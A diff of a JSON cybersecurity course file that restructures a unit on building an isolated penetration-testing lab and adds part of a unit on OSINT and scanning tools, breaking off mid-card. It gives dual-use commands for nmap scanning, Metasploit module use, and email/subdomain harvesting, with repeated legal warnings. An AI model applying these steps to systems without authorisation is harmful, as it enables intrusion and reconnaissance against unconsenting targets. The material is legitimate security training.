@@ -1,5 +1,5 @@
 {
-  "version": 17,
+  "version": 18,
   "units": [
     {
       "id": "unit_01",
@@ -3348,1064 +3348,1563 @@
       ]
     },
     {
-  "id": "unit_07",
-  "title": "Unit 7: Building a Cyber Security Lab",
-  "description": "Hands-on setup of a full, isolated penetration testing lab — VMware/VirtualBox, Kali Linux, target machines, bridged networking, Metasploit, and a Raspberry Pi.",
-  "modules": [
-    {
-      "id": "u7_m1",
-      "title": "Why Build a Cyber Security Lab?",
-      "description": "The purpose and architecture behind a safe, legal place to practice hacking.",
-      "is_pro": false,
-      "lessons": [
+      "id": "unit_07",
+      "title": "Unit 7: Building a Cyber Security Lab",
+      "description": "Hands-on setup of a full, isolated penetration testing lab — VMware/VirtualBox, Kali Linux, target machines, bridged networking, Metasploit, and a Raspberry Pi.",
+      "modules": [
         {
-          "id": "u7_m1_l1",
-          "title": "Lab Purpose & Architecture",
-          "cards": [
+          "id": "u7_m1",
+          "title": "Why Build a Cyber Security Lab?",
+          "description": "The purpose and architecture behind a safe, legal place to practice hacking.",
+          "is_pro": false,
+          "lessons": [
             {
-              "id": "u7_m1_l1_c1",
-              "title": "Why Build a Cyber Security Lab?",
-              "body": "A lab is an isolated, safe environment to practice ethical hacking techniques legally, preventing any accidental impact on real production networks or the internet. It lets you experiment freely, break things, and learn without real-world consequences. The industry-standard setup includes an attacker machine (Kali), a target machine (Windows 7), and a deliberately vulnerable machine (Metasploitable2). The Golden Rule: never test tools or attacks on networks you don't own or have written permission for."
+              "id": "u7_m1_l1",
+              "title": "Lab Purpose & Architecture",
+              "cards": [
+                {
+                  "id": "u7_m1_l1_c1",
+                  "title": "Why Build a Cyber Security Lab?",
+                  "body": "A lab is an isolated, safe environment to practice ethical hacking techniques legally, preventing any accidental impact on real production networks or the internet. It lets you experiment freely, break things, and learn without real-world consequences. The industry-standard setup includes an attacker machine (Kali), a target machine (Windows 7), and a deliberately vulnerable machine (Metasploitable2). The Golden Rule: never test tools or attacks on networks you don't own or have written permission for."
+                },
+                {
+                  "id": "u7_m1_l1_c2",
+                  "title": "Lab Architecture Overview",
+                  "body": "The Host Machine is your physical laptop/desktop running virtualization software (VMware or VirtualBox). The Attacker VM (Kali Linux) is the penetration testing machine used to scan and exploit targets. The Target VMs (Windows 7 & Metasploitable2) are practice machines you will legally scan and test. All machines connect on the same isolated/bridged network segment for hands-on exercises."
+                }
+              ],
+              "quiz": {
+                "question": "What is the 'Golden Rule' of practicing in a cyber security lab?",
+                "options": [
+                  "Always use the fastest scan settings",
+                  "Never test tools or attacks on networks you don't own or have written permission for",
+                  "Always disable your firewall first",
+                  "Only practice on weekends"
+                ],
+                "correct_index": 1,
+                "explanation": "Practicing only in your own authorised lab is both an ethical and a legal requirement — this is the foundational rule of ethical hacking."
+              }
+            }
+          ]
+        },
+        {
+          "id": "u7_m2",
+          "title": "Virtualization Platforms",
+          "description": "Setting up VMware Workstation and VirtualBox, and choosing between them.",
+          "is_pro": false,
+          "lessons": [
+            {
+              "id": "u7_m2_l1",
+              "title": "VMware Workstation",
+              "cards": [
+                {
+                  "id": "u7_m2_l1_c1",
+                  "title": "What is Virtualization?",
+                  "body": "Virtualization lets you run multiple 'virtual computers' (VMs) inside your physical machine. VMware Workstation Pro/Player is a widely used industry-standard virtualization tool for labs. Each VM is fully isolated — actions inside a VM don't affect the host or other VMs. Snapshots let you save a VM's state and instantly revert if something breaks."
+                },
+                {
+                  "id": "u7_m2_l1_c2",
+                  "title": "Installing & Touring VMware",
+                  "body": "Installation: download the installer, run it and accept the license, choose an install location with 20GB+ free space, confirm Intel VT-x/AMD-V is enabled in BIOS/UEFI, then launch and license VMware. The interface has a Library Pane listing all VMs, Power Controls to start/stop VMs, a Snapshot Manager for undo history, and a Virtual Network Editor to customise VMnet adapters."
+                },
+                {
+                  "id": "u7_m2_l1_c3",
+                  "title": "VMware Network Modes",
+                  "body": "Bridged: the VM gets its own IP directly on the physical LAN, behaving like a separate physical device (used for this lab). NAT: the VM shares the host's IP to reach the internet, good for updates only. Host-Only: the VM can talk only to the host and other Host-Only VMs, fully isolated from the internet."
+                }
+              ],
+              "quiz": {
+                "question": "Which VMware network mode gives a VM its own IP address directly on the physical LAN?",
+                "options": [
+                  "NAT",
+                  "Host-Only",
+                  "Bridged",
+                  "Airplane Mode"
+                ],
+                "correct_index": 2,
+                "explanation": "Bridged mode makes the VM appear as a separate physical device on the LAN, which is required when other machines need to reach it at its own IP — like in this lab."
+              }
             },
             {
-              "id": "u7_m1_l1_c2",
-              "title": "Lab Architecture Overview",
-              "body": "The Host Machine is your physical laptop/desktop running virtualization software (VMware or VirtualBox). The Attacker VM (Kali Linux) is the penetration testing machine used to scan and exploit targets. The Target VMs (Windows 7 & Metasploitable2) are practice machines you will legally scan and test. All machines connect on the same isolated/bridged network segment for hands-on exercises."
+              "id": "u7_m2_l2",
+              "title": "VirtualBox & Choosing a Hypervisor",
+              "cards": [
+                {
+                  "id": "u7_m2_l2_c1",
+                  "title": "VirtualBox Overview & Setup",
+                  "body": "Oracle VM VirtualBox is a free, open-source virtualization platform available on Windows, Linux, and macOS hosts. Its feature set closely mirrors VMware: snapshots, virtual networking, shared folders, and cloning. The Extension Pack adds USB 3.0 support, disk encryption, and remote display. To install: download the installer, run it (accepting the temporary network disconnect), install the matching Extension Pack, confirm VT-x/AMD-V is enabled, then launch and click New to create a VM."
+                },
+                {
+                  "id": "u7_m2_l2_c2",
+                  "title": "VirtualBox Network Modes",
+                  "body": "Bridged Adapter: connects directly to the physical LAN, getting its own IP (used for this lab). NAT: shares the host's connection but isn't reachable from other devices. NAT Network: like NAT but lets multiple VMs see each other. Host-Only Adapter: reaches only the host and other Host-Only VMs. Internal Network: VMs reach only each other, not even the host."
+                },
+                {
+                  "id": "u7_m2_l2_c3",
+                  "title": "VMware vs VirtualBox",
+                  "body": "VMware Workstation generally offers faster 3D graphics and better performance for heavier guest OSes, a more polished snapshot/cloning UI, and is preferred in many enterprise environments (Player is free, Pro is paid). Oracle VirtualBox is completely free and open-source for all use cases, cross-platform with an identical experience everywhere, and has slightly simpler networking for beginners — an excellent choice for students and used interchangeably with VMware in this course."
+                }
+              ],
+              "quiz": {
+                "question": "Which statement about VirtualBox is accurate?",
+                "options": [
+                  "It only runs on Windows",
+                  "It is completely free and open-source for all use cases",
+                  "It cannot support Bridged networking",
+                  "It requires a paid license for students"
+                ],
+                "correct_index": 1,
+                "explanation": "Unlike VMware Pro, VirtualBox is completely free and open-source, making it an excellent choice for students building a home lab."
+              }
             }
-          ],
-          "quiz": {
-            "question": "What is the 'Golden Rule' of practicing in a cyber security lab?",
-            "options": [
-              "Always use the fastest scan settings",
-              "Never test tools or attacks on networks you don't own or have written permission for",
-              "Always disable your firewall first",
-              "Only practice on weekends"
-            ],
-            "correct_index": 1,
-            "explanation": "Practicing only in your own authorised lab is both an ethical and a legal requirement — this is the foundational rule of ethical hacking."
-          }
+          ]
+        },
+        {
+          "id": "u7_m3",
+          "title": "Setting Up the Lab Machines",
+          "description": "Installing the attacker VM, the target VM, and the deliberately vulnerable machine.",
+          "is_pro": false,
+          "lessons": [
+            {
+              "id": "u7_m3_l1",
+              "title": "Installing Kali Linux",
+              "cards": [
+                {
+                  "id": "u7_m3_l1_c1",
+                  "title": "Kali as a Virtual Machine",
+                  "body": "Use the official pre-built VMware/VirtualBox image for the fastest, most reliable setup: download the Kali image (.7z) from kali.org/get-kali, extract it to reveal the .vmx or .vbox/.vdi files, import/open it in your hypervisor, allocate at least 4GB RAM and 2 CPU cores, then power on and log in with default credentials kali/kali before changing the password immediately."
+                },
+                {
+                  "id": "u7_m3_l1_c2",
+                  "title": "First Boot & Post-Install Setup",
+                  "body": "Immediately run 'sudo apt update && sudo apt full-upgrade' to bring the system current. Change the default password with 'passwd'. Install VMware Tools/Guest Additions for better display and clipboard support. Take a clean snapshot right after setup as your 'known good' restore point. Confirm networking is set to Bridged mode so Kali gets its own IP on the lab network."
+                },
+                {
+                  "id": "u7_m3_l1_c3",
+                  "title": "Essential Pen-Testing Commands",
+                  "body": "'ip a' confirms the IP address Kali received. 'sudo netdiscover -r <subnet>' discovers live hosts on the local subnet. 'nmap -sn <subnet>' ping-sweeps a subnet. 'nmap -sV -p- <target-ip>' runs a full port scan with service detection. 'msfconsole' launches the Metasploit Framework. 'searchsploit <keyword>' searches the local Exploit-DB copy for known exploits."
+                }
+              ],
+              "quiz": {
+                "question": "What should you do immediately after Kali's first boot, before anything else?",
+                "options": [
+                  "Start scanning other networks",
+                  "Run a full system update and change the default password",
+                  "Delete the default user account",
+                  "Disable the network adapter"
+                ],
+                "correct_index": 1,
+                "explanation": "Updating the system and changing the default kali/kali password are essential first steps — leaving default credentials in place is a serious security risk."
+              }
+            },
+            {
+              "id": "u7_m3_l2",
+              "title": "Windows 7 Target Machine",
+              "cards": [
+                {
+                  "id": "u7_m3_l2_c1",
+                  "title": "Setting Up Windows 7",
+                  "body": "Windows 7 is used as a legacy, deliberately-unpatched target for safe exploitation practice. Steps: obtain a licensed ISO/product key, create a new VM (Windows 7, 2GB+ RAM, 40GB disk), install Windows from the ISO, install Guest Tools for better integration, then set the network adapter to Bridged so it joins the same lab subnet as Kali."
+                },
+                {
+                  "id": "u7_m3_l2_c2",
+                  "title": "Configuration Notes",
+                  "body": "Disable Windows Firewall temporarily (lab-only setting) so scans aren't blocked. Turn off Automatic Updates to keep a known, testable vulnerability set. Note the machine's IP with 'ipconfig'. Create a simple local user account with a weak password for authentication exercises. Take a snapshot immediately so the vulnerable state can always be restored. These settings are intentionally weak for learning — never replicate them outside an isolated lab."
+                }
+              ],
+              "quiz": {
+                "question": "Why is the Windows Firewall temporarily disabled on the Windows 7 target VM?",
+                "options": [
+                  "To make the VM boot faster",
+                  "So scans and exploits from the lab exercises aren't blocked",
+                  "It's required by Windows 7 licensing",
+                  "To save disk space"
+                ],
+                "correct_index": 1,
+                "explanation": "This is a lab-only setting that lets cadets practice scanning and exploitation without the firewall interfering — never used outside an isolated lab."
+              }
+            },
+            {
+              "id": "u7_m3_l3",
+              "title": "Metasploitable2",
+              "cards": [
+                {
+                  "id": "u7_m3_l3_c1",
+                  "title": "What & Why",
+                  "body": "Metasploitable2 is an intentionally vulnerable Linux virtual machine, built by Rapid7 for security training. It ships pre-loaded with outdated, exploitable services like FTP, Samba, MySQL, and Tomcat. It is designed specifically to be scanned and exploited — a completely legal target within your own lab, and a perfect companion to Metasploit since most of its vulnerabilities have a matching module. Never expose it to a real network or the internet."
+                },
+                {
+                  "id": "u7_m3_l3_c2",
+                  "title": "Downloading, Importing & First Login",
+                  "body": "Get the Metasploitable2 zip from SourceForge/Rapid7's mirror, extract it to reveal the .vmdk disk file, create a new VM (Linux, Other Linux 2.6.x kernel, 512MB RAM is sufficient), attach the .vmdk as the hard disk, and set the network to Bridged. Default login is msfadmin/msfadmin. Run 'ifconfig' to note its IP. Never run 'apt update' or patch this machine — doing so removes the intentional vulnerabilities. Take a snapshot immediately so the vulnerable baseline can always be restored."
+                }
+              ],
+              "quiz": {
+                "question": "Why should you never run 'apt update' on Metasploitable2?",
+                "options": [
+                  "It would use too much bandwidth",
+                  "It would remove the intentional vulnerabilities the machine is built to have",
+                  "The machine has no internet access",
+                  "It requires a different package manager"
+                ],
+                "correct_index": 1,
+                "explanation": "Metasploitable2 is deliberately kept vulnerable and outdated for training purposes — patching it would defeat its entire purpose."
+              }
+            }
+          ]
+        },
+        {
+          "id": "u7_m4",
+          "title": "Bridged Networking & Lab Connectivity",
+          "description": "Connecting every lab machine on one subnet and verifying it actually works.",
+          "is_pro": false,
+          "lessons": [
+            {
+              "id": "u7_m4_l1",
+              "title": "Understanding Bridged Networking",
+              "cards": [
+                {
+                  "id": "u7_m4_l1_c1",
+                  "title": "Bridged Networking Explained",
+                  "body": "A bridged adapter makes the VM appear as a separate physical device on your existing LAN. The VM requests its own IP address from the same DHCP server (usually your router) as your laptop. All bridged VMs — Kali, Windows 7, Metasploitable2 — can reach each other exactly like real machines on a network. Because it touches the real LAN, only use bridged mode on a private, trusted network, never on a public one."
+                },
+                {
+                  "id": "u7_m4_l1_c2",
+                  "title": "Configuring Bridged Network — All Three VMs",
+                  "body": "For each VM (Kali, Windows 7, Metasploitable2): open Settings → Network Adapter, change the mode from NAT to Bridged, choose your active host network card (Wi-Fi or Ethernet) as the bridge source, power on all VMs together so they request IPs, then confirm each machine received an IP in the same subnet as your host (e.g. 192.168.1.x)."
+                },
+                {
+                  "id": "u7_m4_l1_c3",
+                  "title": "IP Addressing Plan for the Bridged Lab",
+                  "body": "Example addressing on a typical home/lab subnet 192.168.1.0/24: Host Machine (runs the hypervisor) at 192.168.1.10, Kali Linux VM (attacker) at 192.168.1.101, Windows 7 VM (target #1) at 192.168.1.102, Metasploitable2 VM (target #2, vulnerable) at 192.168.1.103, and Raspberry Pi (physical device) at 192.168.1.104."
+                }
+              ],
+              "quiz": {
+                "question": "In Bridged mode, where does a VM get its IP address from?",
+                "options": [
+                  "The VM always uses 127.0.0.1",
+                  "The same DHCP server (usually your router) as your physical laptop",
+                  "It never gets an IP address",
+                  "Only from the hypervisor software itself"
+                ],
+                "correct_index": 1,
+                "explanation": "A bridged VM behaves like a separate physical device on the LAN, requesting its own IP from the same DHCP server as the host machine."
+              }
+            },
+            {
+              "id": "u7_m4_l2",
+              "title": "Verifying the Lab Network",
+              "cards": [
+                {
+                  "id": "u7_m4_l2_c1",
+                  "title": "Ping Test Between All VMs",
+                  "body": "Run these from a terminal/Command Prompt on each machine to confirm the bridged network is working end-to-end: from Kali, 'ping 192.168.1.102' confirms Kali can reach Windows 7, and 'ping 192.168.1.103' confirms it can reach Metasploitable2. From Windows 7, 'ping 192.168.1.101' confirms it can reach Kali. The host should also be able to ping every VM."
+                },
+                {
+                  "id": "u7_m4_l2_c2",
+                  "title": "Verifying Interfaces on Each VM",
+                  "body": "On Kali/Metasploitable2 (Linux), run 'ip a' or 'ifconfig' to list interfaces and confirm the assigned IP. On Windows 7, run 'ipconfig /all' to see the IPv4 address and adapter status. Confirm the subnet mask and gateway match your host's network. If a VM shows an APIPA address (169.254.x.x), the bridged adapter failed to reach DHCP — recheck the adapter setting."
+                },
+                {
+                  "id": "u7_m4_l2_c3",
+                  "title": "Scanning the Lab with Nmap",
+                  "body": "From Kali: 'nmap -sn 192.168.1.0/24' ping-sweeps the subnet to discover every live host. 'nmap -sV 192.168.1.102' scans the Windows 7 VM for open ports and service versions. 'nmap -sV 192.168.1.103' scans Metasploitable2, revealing its many deliberately open, outdated services. 'nmap -A 192.168.1.103' runs an aggressive scan with OS detection, scripts, and traceroute. Save results with '-oN scan.txt' for later review."
+                }
+              ],
+              "quiz": {
+                "question": "What does it mean if a VM shows an IP address starting with 169.254.x.x?",
+                "options": [
+                  "The VM has successfully connected to the internet",
+                  "The bridged adapter failed to reach DHCP",
+                  "The VM is running in Host-Only mode correctly",
+                  "The VM has a static IP configured"
+                ],
+                "correct_index": 1,
+                "explanation": "A 169.254.x.x (APIPA) address means the VM couldn't reach a DHCP server, indicating a bridged adapter misconfiguration."
+              }
+            },
+            {
+              "id": "u7_m4_l3",
+              "title": "Lab Topology & Snapshots",
+              "cards": [
+                {
+                  "id": "u7_m4_l3_c1",
+                  "title": "Bridged Lab Topology",
+                  "body": "All bridged machines connect through the physical router/switch on one LAN with a shared DHCP pool (e.g. 192.168.1.0/24). The Host Machine runs VMware/VirtualBox, the Kali Linux VM is the attacker, and the Windows 7 and Metasploitable2 VMs are the targets. All machines share one subnet — Kali can directly scan and exploit both target VMs, exactly like real hardware on a LAN."
+                },
+                {
+                  "id": "u7_m4_l3_c2",
+                  "title": "Snapshotting Your Lab",
+                  "body": "Take a snapshot of every VM once the bridged network is confirmed working — this is your clean baseline. Name snapshots clearly, e.g. 'Clean-Bridged-Verified'. Snapshot again before any exploitation attempt that could crash or corrupt a target machine. Reverting a snapshot takes seconds and instantly undoes any damage. A disciplined snapshot habit is what makes repeated, safe experimentation possible."
+                }
+              ],
+              "quiz": {
+                "question": "When should you take a fresh snapshot of a lab VM?",
+                "options": [
+                  "Only once, when the VM is first created",
+                  "After confirming the bridged network works, and again before any risky exploitation attempt",
+                  "Only after the VM has already crashed",
+                  "Snapshots are unnecessary if you have backups"
+                ],
+                "correct_index": 1,
+                "explanation": "A clean baseline snapshot plus a fresh one before any risky action lets you instantly revert any damage from a failed exercise."
+              }
+            }
+          ]
+        },
+        {
+          "id": "u7_m5",
+          "title": "Metasploit Framework",
+          "description": "Setting up and using the industry-standard exploitation framework.",
+          "is_pro": false,
+          "lessons": [
+            {
+              "id": "u7_m5_l1",
+              "title": "Getting Started with Metasploit",
+              "cards": [
+                {
+                  "id": "u7_m5_l1_c1",
+                  "title": "Metasploit Framework Overview",
+                  "body": "Metasploit is the industry-standard framework for developing and executing exploit code. It comes pre-installed on Kali Linux with thousands of ready-to-use exploit and auxiliary modules. 'msfconsole' is the primary command-line interface used to search, configure, and launch modules, backed by a PostgreSQL database that stores hosts, scan results, credentials, and session data."
+                },
+                {
+                  "id": "u7_m5_l1_c2",
+                  "title": "Configuring the Metasploit Database",
+                  "body": "Setup steps: 'sudo systemctl start postgresql' ensures the database service is running. 'sudo msfdb init' creates the Metasploit database and user credentials. Run 'msfconsole' to open the interface. Inside msfconsole, run 'db_status' to confirm a successful connection. Finally, 'workspace -a lab-day2' creates a workspace to organise this course's findings separately."
+                }
+              ],
+              "quiz": {
+                "question": "What must be running before Metasploit's database features will work?",
+                "options": [
+                  "A web browser",
+                  "The PostgreSQL service",
+                  "A VPN connection",
+                  "Windows Defender"
+                ],
+                "correct_index": 1,
+                "explanation": "Metasploit stores hosts, scan results, and session data in a PostgreSQL database, which must be started with 'sudo systemctl start postgresql' before use."
+              }
+            },
+            {
+              "id": "u7_m5_l2",
+              "title": "Using msfconsole",
+              "cards": [
+                {
+                  "id": "u7_m5_l2_c1",
+                  "title": "Workspace & db_status",
+                  "body": "A workspace is an isolated project space inside the Metasploit database for organising one engagement. 'workspace' lists all workspaces; 'workspace -a <name>' creates and switches to a new one. 'db_nmap <target>' runs Nmap and automatically stores the results into the current workspace. 'hosts' and 'services' commands show everything discovered so far in the active workspace."
+                },
+                {
+                  "id": "u7_m5_l2_c2",
+                  "title": "Basic msfconsole Commands",
+                  "body": "'search <keyword>' searches all modules for a keyword, e.g. 'search vsftpd'. 'use <module-path>' selects a specific exploit or auxiliary module. 'show options' displays the parameters the module needs (RHOSTS, RPORT, etc.). 'set RHOSTS <ip>' sets the target IP. 'set PAYLOAD <payload>' chooses what code runs after successful exploitation. 'exploit' or 'run' launches the configured module."
+                }
+              ],
+              "quiz": {
+                "question": "Which msfconsole command runs Nmap and automatically saves the results into the current workspace?",
+                "options": [
+                  "search",
+                  "db_nmap",
+                  "show options",
+                  "exploit"
+                ],
+                "correct_index": 1,
+                "explanation": "'db_nmap' combines an Nmap scan with automatic storage into Metasploit's database, keeping all reconnaissance organised by workspace."
+              }
+            }
+          ]
+        },
+        {
+          "id": "u7_m6",
+          "title": "Raspberry Pi & Wrapping Up",
+          "description": "Adding a physical device to the lab, then checking, troubleshooting, and closing out safely.",
+          "is_pro": false,
+          "lessons": [
+            {
+              "id": "u7_m6_l1",
+              "title": "Raspberry Pi in the Lab",
+              "cards": [
+                {
+                  "id": "u7_m6_l1_c1",
+                  "title": "Raspberry Pi Overview",
+                  "body": "A low-cost, credit-card-sized single-board computer widely used in security labs. It's useful for building portable pen-testing kits, IoT security testing, and network monitoring devices. It can run Kali Linux ARM edition directly, turning it into a compact attacker platform, and is popular in real-world red-team exercises for covert physical network drops."
+                },
+                {
+                  "id": "u7_m6_l1_c2",
+                  "title": "Setup & Network Configuration",
+                  "body": "Setup: download the Raspberry Pi Imager, flash Kali Linux ARM or Raspberry Pi OS to a microSD card, enable SSH before first boot for headless setup, insert the card and power on, then SSH in from your laptop. Networking: assign a static IP via /etc/dhcpcd.conf, connect to the same bridged/lab network as Kali and Windows 7, change the default password immediately, and verify with 'ssh pi@<static-ip>' from Kali."
+                }
+              ],
+              "quiz": {
+                "question": "Why is a static IP address assigned to the Raspberry Pi in the lab?",
+                "options": [
+                  "Static IPs are required by all Linux devices",
+                  "So the Pi is always reachable at the same address across lab sessions",
+                  "To disable SSH access",
+                  "It makes the Pi run Kali Linux faster"
+                ],
+                "correct_index": 1,
+                "explanation": "A static IP keeps the Raspberry Pi reliably reachable at the same address every time, which is essential for consistent lab exercises."
+              }
+            },
+            {
+              "id": "u7_m6_l2",
+              "title": "Lab Checklist & Troubleshooting",
+              "cards": [
+                {
+                  "id": "u7_m6_l2_c1",
+                  "title": "Lab Setup Checklist",
+                  "body": "Before starting exercises, confirm: VMware or VirtualBox installed and working; Kali Linux VM installed, updated, and snapshotted; Windows 7 VM installed as an isolated target; Metasploitable2 VM imported and running; all VMs connected via Bridged network and pinging each other; Metasploit configured with a working database and workspace; Raspberry Pi flashed, given a static IP, and reachable via SSH; clean snapshots taken of every VM."
+                },
+                {
+                  "id": "u7_m6_l2_c2",
+                  "title": "Common Setup Issues & Command-Line Mistakes",
+                  "body": "If VMs can't ping each other, confirm all are set to Bridged mode on the same physical NIC. No internet in Kali? Temporarily switch to NAT for updates, then back to Bridged. If msfconsole shows 'db not connected', restart PostgreSQL and re-run msfdb init. Common command-line mistakes: forgetting 'chmod +x' before running a script, forgetting 'sudo' for admin tasks, and getting stuck in vi (press Esc then type ':q!' to quit without saving)."
+                }
+              ],
+              "quiz": {
+                "question": "What's the fix if 'msfconsole' reports the database is not connected?",
+                "options": [
+                  "Reinstall Kali Linux entirely",
+                  "Run 'sudo systemctl start postgresql' then 'sudo msfdb init' again",
+                  "Switch the network adapter to Host-Only",
+                  "Restart the physical router"
+                ],
+                "correct_index": 1,
+                "explanation": "Restarting the PostgreSQL service and reinitialising the Metasploit database resolves the most common 'db not connected' error."
+              }
+            },
+            {
+              "id": "u7_m6_l3",
+              "title": "Ethics & Key Takeaways",
+              "cards": [
+                {
+                  "id": "u7_m6_l3_c1",
+                  "title": "Legal & Ethical Boundaries",
+                  "body": "Every tool and technique in this course must only be used inside your own isolated/bridged lab. Scanning, exploiting, or accessing any system without explicit written authorisation is illegal in India and most countries. Bridged networking makes your VMs visible on the wider LAN — never point scans or exploits at other devices on that network. Real-world engagements always begin with a signed scope-of-work and rules of engagement document. When in doubt, don't run it — ask an instructor first."
+                },
+                {
+                  "id": "u7_m6_l3_c2",
+                  "title": "Key Takeaways",
+                  "body": "VMware and VirtualBox both provide everything needed to build a professional-grade lab. Bridged networking gives every VM its own IP, letting Kali, Windows 7, Metasploitable2, and the Pi interact like real hardware. Metasploitable2 is deliberately vulnerable and must never be exposed beyond the lab. Metasploit, backed by a working PostgreSQL database, is the central exploitation framework used throughout. Snapshots are what make fearless, repeatable practice possible."
+                }
+              ],
+              "quiz": {
+                "question": "Since bridged networking makes lab VMs visible on the wider LAN, what is the correct practice?",
+                "options": [
+                  "Scan any device you can see on the network for practice",
+                  "Never point scans or exploits at devices outside your defined lab scope",
+                  "Bridged mode is always safe to use on public Wi-Fi",
+                  "Ask forgiveness later if you accidentally scan a neighbor's device"
+                ],
+                "correct_index": 1,
+                "explanation": "Because bridged VMs are visible on the real LAN, scanning or exploiting anything outside your own authorised lab machines is illegal and unethical."
+              }
+            }
+          ]
         }
       ]
     },
     {
-      "id": "u7_m2",
-      "title": "Virtualization Platforms",
-      "description": "Setting up VMware Workstation and VirtualBox, and choosing between them.",
-      "is_pro": false,
-      "lessons": [
+      "id": "unit_08",
+      "title": "Unit 8: Advanced Reconnaissance & Scanning Toolkit",
+      "description": "Beyond WHOIS and basic Nmap — OSINT with Maltego, vulnerability scanning with OpenVAS, packet analysis with Wireshark, and web app testing with Burp Suite.",
+      "modules": [
         {
-          "id": "u7_m2_l1",
-          "title": "VMware Workstation",
-          "cards": [
+          "id": "u8_m1",
+          "title": "Advanced OSINT & Maltego",
+          "description": "Visual link analysis and automated open-source intelligence gathering tools.",
+          "is_pro": false,
+          "lessons": [
             {
-              "id": "u7_m2_l1_c1",
-              "title": "What is Virtualization?",
-              "body": "Virtualization lets you run multiple 'virtual computers' (VMs) inside your physical machine. VMware Workstation Pro/Player is a widely used industry-standard virtualization tool for labs. Each VM is fully isolated — actions inside a VM don't affect the host or other VMs. Snapshots let you save a VM's state and instantly revert if something breaks."
+              "id": "u8_m1_l1",
+              "title": "What is Maltego?",
+              "cards": [
+                {
+                  "id": "u8_m1_l1_c1",
+                  "title": "Maltego Overview",
+                  "body": "Maltego is a visual link-analysis tool used to map relationships between people, domains, and infrastructure. It turns scattered OSINT data points into a single visual graph showing how everything connects, and is widely used in reconnaissance, threat intelligence, and fraud investigation. It comes pre-installed on Kali Linux, with both a free Community Edition (CE) and paid editions available."
+                },
+                {
+                  "id": "u8_m1_l1_c2",
+                  "title": "Entities, Transforms & Machines",
+                  "body": "Entities are the building blocks — a Domain, Person, Email Address, or IP Address placed on the graph. Transforms are queries that expand an entity, e.g. running 'To DNS Name' on a domain reveals subdomains. Machines chain multiple transforms together automatically to run a whole workflow in one click. The Transform Hub connects Maltego to the external data sources that power each transform."
+                }
+              ],
+              "quiz": {
+                "question": "In Maltego, what is a 'Transform'?",
+                "options": [
+                  "A visual theme for the graph",
+                  "A query that expands an entity to reveal new connected data",
+                  "A type of malware",
+                  "A way to encrypt the graph file"
+                ],
+                "correct_index": 1,
+                "explanation": "Transforms are the core mechanism in Maltego — running one on an entity (like a domain) pulls in new related data, such as subdomains or IP addresses."
+              }
             },
             {
-              "id": "u7_m2_l1_c2",
-              "title": "Installing & Touring VMware",
-              "body": "Installation: download the installer, run it and accept the license, choose an install location with 20GB+ free space, confirm Intel VT-x/AMD-V is enabled in BIOS/UEFI, then launch and license VMware. The interface has a Library Pane listing all VMs, Power Controls to start/stop VMs, a Snapshot Manager for undo history, and a Virtual Network Editor to customise VMnet adapters."
+              "id": "u8_m1_l2",
+              "title": "Using Maltego",
+              "cards": [
+                {
+                  "id": "u8_m1_l2_c1",
+                  "title": "Common Entity Types",
+                  "body": "Domain (a website or organisation's domain name), DNS Name (a specific hostname or subdomain), IPv4 Address (a specific host), Email Address (linked to a person or organisation), Person (a named individual, often linked to social profiles), and Organization (a company, linking together its people and infrastructure)."
+                },
+                {
+                  "id": "u8_m1_l2_c2",
+                  "title": "Footprinting a Domain",
+                  "body": "A typical workflow: drag a Domain entity onto the graph and enter the target's domain name, then use 'To DNS Name' and 'To IP Address' to reveal subdomains and hosting IPs, run further transforms on each new entity (netblocks, ASNs, related domains), and finally review the resulting graph to identify infrastructure patterns. 'Machines' like Footprint L1/L2/L3 automate increasingly deep versions of this same process."
+                },
+                {
+                  "id": "u8_m1_l2_c3",
+                  "title": "Maltego CE vs Pro",
+                  "body": "The Community Edition (CE) is free but caps the number of results returned per transform run. The Professional edition requires a paid licence, removes that cap, supports team collaboration and shared graphs, and adds more export/reporting formats for client deliverables."
+                }
+              ],
+              "quiz": {
+                "question": "What is the main limitation of Maltego's free Community Edition compared to Professional?",
+                "options": [
+                  "CE cannot use any transforms at all",
+                  "CE caps the number of results returned per transform run",
+                  "CE only works on Windows",
+                  "CE cannot display any graph at all"
+                ],
+                "correct_index": 1,
+                "explanation": "The Community Edition works fully but limits results per transform, while Professional removes that cap and adds collaboration and export features."
+              }
             },
             {
-              "id": "u7_m2_l1_c3",
-              "title": "VMware Network Modes",
-              "body": "Bridged: the VM gets its own IP directly on the physical LAN, behaving like a separate physical device (used for this lab). NAT: the VM shares the host's IP to reach the internet, good for updates only. Host-Only: the VM can talk only to the host and other Host-Only VMs, fully isolated from the internet."
+              "id": "u8_m1_l3",
+              "title": "OSINT Framework & Harvesting Tools",
+              "cards": [
+                {
+                  "id": "u8_m1_l3_c1",
+                  "title": "The OSINT Framework — The Big Picture",
+                  "body": "OSINT (Open-Source Intelligence) is information legally gathered from publicly available sources. The OSINT Framework (osintframework.com) catalogues hundreds of free tools by category — usernames, email addresses, domains, social media, and public records. Effective OSINT combines multiple tools, since no single tool covers every data source."
+                },
+                {
+                  "id": "u8_m1_l3_c2",
+                  "title": "theHarvester",
+                  "body": "theHarvester harvests emails and subdomains from search engines. 'theharvester -d example.com -b google' uses Google as the source. 'theharvester -d example.com -b bing,linkedin' combines multiple sources in one search. The '-l' flag limits results, '-b all' searches every available source, and '-f report' saves results to an HTML/XML report file."
+                },
+                {
+                  "id": "u8_m1_l3_c3",
+                  "title": "Recon-ng",
+                  "body": "Recon-ng is a modular, scriptable reconnaissance framework. 'workspaces create client_a' creates an isolated workspace to keep an engagement's data separate. 'modules load recon/domains-hosts/hackertarget' loads a specific module. 'options set SOURCE example.com' sets the target domain, 'run' executes it, and 'show hosts' displays all hosts discovered so far."
+                }
+              ],
+              "quiz": {
+                "question": "What does theHarvester's '-b' flag control?",
+                "options": [
+                  "The output file format",
+                  "The number of results to return",
+                  "Which search engine or service to query as the data source",
+                  "The target's IP address"
+                ],
+                "correct_index": 2,
+                "explanation": "The '-b' (source) flag chooses which search engine or service — like google, bing, or linkedin — theHarvester queries for emails and subdomains."
+              }
+            },
+            {
+              "id": "u8_m1_l4",
+              "title": "Search-Based & Automated OSINT",
+              "cards": [
+                {
+                  "id": "u8_m1_l4_c1",
+                  "title": "Shodan — Search Operators",
+                  "body": "Shodan indexes internet-connected devices rather than websites. Operators include: 'apache country:\"IN\"' finds Apache servers in a specific country, 'port:3389' finds devices with RDP open, 'org:\"Example Corp\"' finds devices registered to an organisation, and 'product:\"MySQL\"' finds devices running a specific product."
+                },
+                {
+                  "id": "u8_m1_l4_c2",
+                  "title": "Google Dorking — Advanced Operators",
